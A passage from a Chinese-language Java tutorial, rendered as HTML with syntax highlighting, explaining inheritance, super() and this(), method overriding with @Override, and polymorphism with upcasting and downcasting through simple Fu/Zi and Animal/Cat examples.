linTao.setAge(<span class="string">&quot;28&quot;</span>);</span><br><span class="line">          linTao.setSalary(<span class="number">1000.99</span>);</span><br><span class="line">          System.out.println(linTao.getName());</span><br><span class="line">          System.out.println(linTao.getAge());</span><br><span class="line">          System.out.println(linTao.getSalary());</span><br><span class="line">          linTao.admin();</span><br><span class="line"></span><br><span class="line">          <span class="type">Student</span> <span class="variable">xugan</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">          xugan.setName(<span class="string">&quot;播仔&quot;</span>);</span><br><span class="line">          xugan.setAge(<span class="string">&quot;31&quot;</span>);</span><br><span class="line">          <span class="comment">//xugan.setSalary(1000.99); // xugan没有薪水属性，报错！</span></span><br><span class="line">          System.out.println(xugan.getName());</span><br><span class="line">          System.out.println(xugan.getAge());</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h4 id="子类不能继承的内容"><a class="header-anchor" href="#子类不能继承的内容">¶</a>子类不能继承的内容</h4>
<ul>
<li>
<p><strong>子类不能继承父类的构造方法。</strong></p>
</li>
<li>
<p><strong>值得注意的是子类可以继承父类的私有成员（成员变量，方法），只是子类无法直接访问而已，可以通过getter/setter方法访问父类的private成员变量</strong></p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Zi</span> <span class="variable">z</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Zi</span>();</span><br><span class="line">        System.out.println(z.num1);</span><br><span class="line"><span class="comment">//      System.out.println(z.num2); // 私有的子类无法使用</span></span><br><span class="line">        <span class="comment">// 通过getter/setter方法访问父类的private成员变量</span></span><br><span class="line">        System.out.println(z.getNum2());</span><br><span class="line"></span><br><span class="line">        z.show1();</span><br><span class="line">        <span class="comment">// z.show2(); // 私有的子类无法使用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fu</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">num1</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">num2</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show1</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;show1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">show2</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;show2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNum2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> num2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNum2</span><span class="params">(<span class="type">int</span> num2)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.num2 = num2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Zi</span> <span class="keyword">extends</span> <span class="title class_">Fu</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="继承后的特点——成员变量"><a class="header-anchor" href="#继承后的特点——成员变量">¶</a>继承后的特点——成员变量</h4>
<h5 id="成员变量重名"><a class="header-anchor" href="#成员变量重名">¶</a>成员变量重名</h5>
<ul>
<li>子父类中出现了同名的成员变量时，子类会<strong>优先访问自己对象中的成员变量</strong>。</li>
<li>如果此时想访问父类成员变量→使用<strong>super</strong>关键字</li>
</ul>
<h5 id="super访问父类成员变量"><a class="header-anchor" href="#super访问父类成员变量">¶</a>super访问父类成员变量</h5>
<ul>
<li>
<p>子父类中出现了同名的成员变量时，在子类中需要访问父类中非私有成员变量时，需要使用<code>super</code> 关键字，修饰父类成员变量，类似于之前学过的 <code>this</code></p>
</li>
<li>
<p>注意：<strong>super代表的是父类对象的引用，this代表的是当前对象的引用</strong></p>
</li>
<li>
<p><code>super.父类成员变量名</code></p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Fu</span> &#123;</span><br><span class="line">        <span class="comment">// Fu中的成员变量。</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Zi</span> <span class="keyword">extends</span> <span class="title class_">Fu</span> &#123;</span><br><span class="line">        <span class="comment">// Zi中的成员变量</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 访问方法中的num</span></span><br><span class="line">        System.out.println(<span class="string">&quot;method num=&quot;</span> + num);</span><br><span class="line">        <span class="comment">// 访问子类中的num</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Zi num=&quot;</span> + <span class="built_in">this</span>.num);</span><br><span class="line">        <span class="comment">// 访问父类中的num</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Fu num=&quot;</span> + <span class="built_in">super</span>.num);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo04</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">              <span class="comment">// 创建子类对象</span></span><br><span class="line">                <span class="type">Zi1</span> <span class="variable">z</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Zi1</span>();</span><br><span class="line">              <span class="comment">// 调用子类中的show方法</span></span><br><span class="line">                z1.show();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">演示结果：</span><br><span class="line">method num=<span class="number">1</span></span><br><span class="line">Zi num=<span class="number">6</span></span><br><span class="line">Fu num=<span class="number">5</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如何访问父类的私有成员变量→在父类中提供公共的getXxx方法和setXxx方法</li>
</ul>
<h5 id="成员方法重名"><a class="header-anchor" href="#成员方法重名">¶</a>成员方法重名</h5>
<ul>
<li>如果子类父类中出现<strong>重名</strong>的成员方法，则创建子类对象调用该方法的时候，子类对象会优先调用自己的方法</li>
</ul>
<h3 id="方法重写"><a class="header-anchor" href="#方法重写">¶</a>方法重写</h3>
<ul>
<li>子类中出现与父类一模一样的方法时（返回值类型，方法名和参数列表都相同），会出现覆盖效果，也称为重写或者复写。<strong>声明不变，重新实现</strong></li>
</ul>
<h4 id="使用场景与案例"><a class="header-anchor" href="#使用场景与案例">¶</a>使用场景与案例</h4>
<ul>
<li>子类继承了父类的方法，但是子类觉得父类的这方法不足以满足自己的需求，子类重新写了一个与父类同名的方法，以便覆盖父类的该方法</li>
</ul>
<h4 id="Override重写注解"><a class="header-anchor" href="#Override重写注解">¶</a>@Override重写注解</h4>
<ul>
<li>这个注解标记的方法，就说明这个方法必须是重写父类的方法，否则编译阶段报错。</li>
<li>建议重写都加上这个注解，一方面可以提高代码的可读性，一方面可以防止重写出错</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">     <span class="comment">// 声明不变，重新实现</span></span><br><span class="line">    <span class="comment">// 方法名称与父类全部一样，只是方法体中的功能重写写了！</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cry</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我们一起学猫叫，喵喵喵！喵的非常好听！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="注意事项"><a class="header-anchor" href="#注意事项">¶</a>注意事项</h4>
<ol>
<li>方法重写是发生在<strong>子父类之间</strong>的关系。</li>
<li>子类方法<strong>覆盖父类方法</strong>，必须要保证权限大于等于父类权限。</li>
<li>子类方法覆盖父类方法，<strong>返回值类型、函数名和参数列表都要一模一样</strong>。</li>
</ol>
<h3 id="继承后的特点——构造方法"><a class="header-anchor" href="#继承后的特点——构造方法">¶</a>继承后的特点——构造方法</h3>
<ol>
<li>构造方法的名字是与类名一致的。所以子类是无法继承父类构造方法的。</li>
<li>构造方法的作用是初始化对象成员变量数据的。所以子类的初始化过程中，必须先执行父类的初始化动作。子类的构造方法中默认有一个<code>super()</code> ，表示调用父类的构造方法，父类成员变量初始化后，才可以给子类使用。（<strong>先有爸爸，才能有儿子</strong>）</li>
</ol>
<ul>
<li><strong>继承后子类构方法器特点:子类所有构造方法的第一行都会默认先调用父类的无参构造方法</strong></li>
</ul>
<h3 id="super-和this"><a class="header-anchor" href="#super-和this">¶</a>super()和this()</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.成员变量            --    本类的</span><br><span class="line"><span class="built_in">super</span>.成员变量            --    父类的</span><br><span class="line"></span><br><span class="line"><span class="built_in">this</span>.成员方法名()          --    本类的    </span><br><span class="line"><span class="built_in">super</span>.成员方法名()   --    父类的</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="built_in">super</span>(...) -- 调用父类的构造方法，根据参数匹配确认</span><br><span class="line"><span class="built_in">this</span>(...) -- 调用本类的其他构造方法，根据参数匹配确认</span><br></pre></td></tr></table></figure>
<h4 id="super"><a class="header-anchor" href="#super">¶</a>super()</h4>
<ul>
<li><strong>注意：</strong>
<ul>
<li>-<strong>子类的每个构造方法中均有默认的super()，调用父类的空参构造。手动调用父类构造会覆盖默认的super()。</strong></li>
<li><strong>super() 和 this() 都必须是在构造方法的第一行，所以不能同时出现。</strong></li>
<li>super(…)是根据参数去确定调用父类哪个构造方法的。</li>
</ul>
</li>
</ul>
<h4 id="this"><a class="header-anchor" href="#this">¶</a>this()</h4>
<ul>
<li>默认是去找本类中的其他构造方法，根据参数来确定具体调用哪一个构造方法。</li>
<li>为了借用其他构造方法的功能</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima._08this和<span class="built_in">super</span>调用构造方法;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*  this(...):</span></span><br><span class="line"><span class="comment">*  默认是去找本类中的其他构造方法，根据参数来确定具体调用哪一个构造方法。</span></span><br><span class="line"><span class="comment">*  为了借用其他构造方法的功能。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThisDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">xuGan</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        System.out.println(xuGan.getName()); <span class="comment">// 输出:徐干</span></span><br><span class="line">        System.out.println(xuGan.getAge());<span class="comment">// 输出:21</span></span><br><span class="line">        System.out.println(xuGan.getSex());<span class="comment">// 输出： 男</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name ;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age ;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">char</span> sex ;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// 很弱，我的兄弟很牛逼啊，我可以调用其他构造方法：Student(String name, int age, char sex)</span></span><br><span class="line">        <span class="built_in">this</span>(<span class="string">&quot;徐干&quot;</span>,<span class="number">21</span>,<span class="string">&#x27;男&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name, <span class="type">int</span> age, <span class="type">char</span> sex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name ;</span><br><span class="line">        <span class="built_in">this</span>.age = age   ;</span><br><span class="line">        <span class="built_in">this</span>.sex = sex   ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span> <span class="title function_">getSex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">char</span> sex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="小结"><a class="header-anchor" href="#小结">¶</a>小结</h4>
<ul>
<li><strong>子类的每个构造方法中均有默认的super()，调用父类的空参构造。手动调用父类构造会覆盖默认的super()。</strong></li>
<li><strong>super() 和 this() 都必须是在构造方法的第一行，所以不能同时出现。</strong></li>
<li><strong>super(…)和this(…)是根据参数去确定调用父类哪个构造方法的。</strong></li>
<li>super(…)可以调用<u>父类构造方法</u>初始化继承自父类的成员变量的数据。</li>
<li>this(…)可以调用<u>本类中的其他构造方法</u>。</li>
</ul>
<h3 id="继承的特点"><a class="header-anchor" href="#继承的特点">¶</a>继承的特点</h3>
<ol>
<li>Java只支持单继承，不支持多继承。</li>
<li>一个类可以有多个子类。</li>
<li>可以多层继承。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C1</span> <span class="keyword">extends</span> <span class="title class_">A</span> &#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span> <span class="keyword">extends</span> <span class="title class_">C1</span> &#123;&#125;</span><br></pre></td></tr></table></figure>
<p><strong>分享书写技巧：</strong></p>
<p>​        1.在大脑中要区分谁是父，谁是子</p>
<p>​        2.把共性写到父类中，独有的东西写在子类中</p>
<p>​        3.开始编写标准Javabean（从上往下写）</p>
<p>​        4.在测试类中，创建对象并赋值调用</p>
<h2 id="Day14-面向对象进阶（多态-包-final-权限修饰符-代码块）"><a class="header-anchor" href="#Day14-面向对象进阶（多态-包-final-权限修饰符-代码块）">¶</a>Day14 面向对象进阶（多态&amp;包&amp;final&amp;权限修饰符&amp;代码块）</h2>
<h3 id="学习目标-v2"><a class="header-anchor" href="#学习目标-v2">¶</a>学习目标</h3>
<ul>
<li>能够说出使用多态的前提条件</li>
<li>理解多态的向上转型</li>
<li>理解多态的向下转型</li>
<li>能够知道多态的使用场景</li>
<li>包的作用</li>
<li>public和private权限修饰符的作用</li>
<li>描述final修饰的类的特点</li>
<li>描述final修饰的方法的特点</li>
<li>描述final修饰的变量的特点</li>
</ul>
<h3 id="多态"><a class="header-anchor" href="#多态">¶</a>多态</h3>
<ul>
<li>格式</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">父类类型 变量名 = <span class="keyword">new</span> 子类/实现类构造器;</span><br><span class="line">变量名.方法名();</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>前提</p>
<ul>
<li>有继承关系，子类对象是可以赋值给父类类型的变量。</li>
<li>例如Animal是一个动物类型，而Cat是一个猫类型。Cat继承了Animal，Cat对象也是Animal类型，自然可以赋值给父类类型的变量</li>
</ul>
</li>
<li>
<p>有了多态之后，方法的形参就可以定义为<strong>共同的父类Person</strong></p>
</li>
<li>
<p>注意</p>
<ul>
<li>当一个方法的形参是一个<strong>类</strong>，我们可以传递<strong>这个类所有的子类对象</strong></li>
<li>当一个方法的形参是一个<strong>接口</strong>，我们可以传递这个<strong>接口所有的实现类对象</strong></li>
<li>而且多态还可以<strong>根据传递的不同对象</strong>来<strong>调用不同类中的方法</strong></li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父类：</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    空参构造</span><br><span class="line">    带全部参数的构造</span><br><span class="line">    get和set方法</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;, &quot;</span> + age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类1：</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Administrator</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;管理员的信息为：&quot;</span> + getName() + <span class="string">&quot;, &quot;</span> + getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类2：</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;学生的信息为：&quot;</span> + getName() + <span class="string">&quot;, &quot;</span> + getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类3：</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Teacher</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;老师的信息为：&quot;</span> + getName() + <span class="string">&quot;, &quot;</span> + getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试类：</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//创建三个对象，并调用register方法</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        s.setName(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        s.setAge(<span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Teacher</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Teacher</span>();</span><br><span class="line">        t.setName(<span class="string">&quot;王建国&quot;</span>);</span><br><span class="line">        t.setAge(<span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Administrator</span> <span class="variable">admin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Administrator</span>();</span><br><span class="line">        admin.setName(<span class="string">&quot;管理员&quot;</span>);</span><br><span class="line">        admin.setAge(<span class="number">35</span>);</span><br><span class="line"></span><br><span class="line">        register(s);</span><br><span class="line">        register(t);</span><br><span class="line">        register(admin);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这个方法既能接收老师，又能接收学生，还能接收管理员</span></span><br><span class="line">    <span class="comment">//只能把参数写成这三个类型的父类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">(Person p)</span>&#123;</span><br><span class="line">        p.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>定义</p>
<ul>
<li>多态是指同一行为，具有多个不同表现形式</li>
</ul>
</li>
<li>
<p>前提</p>
<ul>
<li>有继承或者实现关系</li>
<li>方法的重写【意义体现：不重写，无意义】</li>
<li>父类引用指向子类对象【格式体现】</li>
</ul>
<blockquote>
<p>父类类型：指子类对象继承的父类类型，或者实现的父接口类型。</p>
</blockquote>
</li>
<li>
<p>运行特点</p>
<ul>
<li>调用成员变量时
<ul>
<li>编译看左边，运行看左边</li>
</ul>
</li>
<li>调用成员方法时
<ul>
<li>编译看左边，运行看右边</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Fu</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Zi</span>();</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment">//编译看左边的父类中有没有name这个属性，没有就报错</span></span><br><span class="line"><span class="comment">//在实际运行的时候，把父类name属性的值打印出来</span></span><br><span class="line">System.out.println(f.name);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//编译看左边的父类中有没有show这个方法，没有就报错</span></span><br><span class="line"><span class="comment">//在实际运行的时候，运行的是子类中的show方法</span></span><br><span class="line">f.show();</span><br></pre></td></tr></table></figure>
<ul>
<li>弊端
<ul>
<li>多态编译阶段是看左边父类类型</li>
<li>如果子类有些独有的功能，此时<strong>多态的写法就无法访问子类独有功能了</strong></li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>｛</span><br><span class="line">        System.out.println(<span class="string">&quot;动物吃东西！&quot;</span>)</span><br><span class="line">    ｝</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;        System.out.println(<span class="string">&quot;吃鱼&quot;</span>);    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">catchMouse</span><span class="params">()</span> &#123;        System.out.println(<span class="string">&quot;抓老鼠&quot;</span>);    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;        System.out.println(<span class="string">&quot;吃骨头&quot;</span>);    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Animal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line">        a.eat();</span><br><span class="line">        a.catchMouse();<span class="comment">//编译报错，编译看左边，Animal没有这个方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="引用类型转换"><a class="header-anchor" href="#引用类型转换">¶</a>引用类型转换</h4>
<ul>
<li>当使用多态方式调用方法时，首先检查父类中是否有该方法，如果没有，则编译错误</li>
<li>想要调用子类特有的方法，必须做向下转型</li>
<li>基本数据类型转换
<ul>
<li>自动转换: 范围小的赋值给范围大的.自动完成:double d = 5;</li>
<li>强制转换: 范围大的赋值给范围小的,强制转换:int i = (int)3.14</li>
</ul>
</li>
<li>多态的转型分为<strong>向上转型</strong>（自动转换）与<strong>向下转型</strong>（强制转换）两种</li>
</ul>
<h5 id="向上转型（自动转换）"><a class="header-anchor" href="#向上转型（自动转换）">¶</a>向上转型（自动转换）</h5>
<ul>
<li>当父类引用指向一个子类对象时，便是向上转型</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">父类类型  变量名 = <span class="keyword">new</span> 子类类型();</span><br><span class="line">如：<span class="type">Animal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>原因</strong>
<ul>
<li><strong>父类类型相对与子类来说是大范围的类型，Animal是动物类，是父类类型。Cat是猫类，是子类类型。Animal类型的范围当然很大，包含一切动物。</strong></li>
<li>所以子类范围小可以直接自动转型给父类类型的变量</li>
</ul>
</li>
</ul>
<h5 id="向下转型（强制转换）"><a class="header-anchor" href="#向下转型（强制转换）">¶</a>向下转型（强制转换）</h5>
<ul>
<li>一个已经向上转型的子类对象，将父类引用转为子类引用，可以使用强制类型转换的格式，便是向下转型</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">子类类型 变量名 = (子类类型) 父类变量名;</span><br><span class="line">如:<span class="type">Aniaml</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line">   <span class="type">Cat</span> <span class="variable">c</span> <span class="operator">=</span>(Cat) a;  </span><br></pre></td></tr></table></figure>
<h5 id="案例演示"><a class="header-anchor" href="#案例演示">¶</a>案例演示</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义类</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;    </span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;        </span><br><span class="line">        System.out.println(<span class="string">&quot;吃鱼&quot;</span>);    &#125;    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">catchMouse</span><span class="params">()</span> &#123;        </span><br><span class="line">        System.out.println(<span class="string">&quot;抓老鼠&quot;</span>);    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;        </span><br><span class="line">        System.out.println(<span class="string">&quot;吃骨头&quot;</span>);    &#125;    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">watchHouse</span><span class="params">()</span> &#123;        </span><br><span class="line">        System.out.println(<span class="string">&quot;看家&quot;</span>);    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span 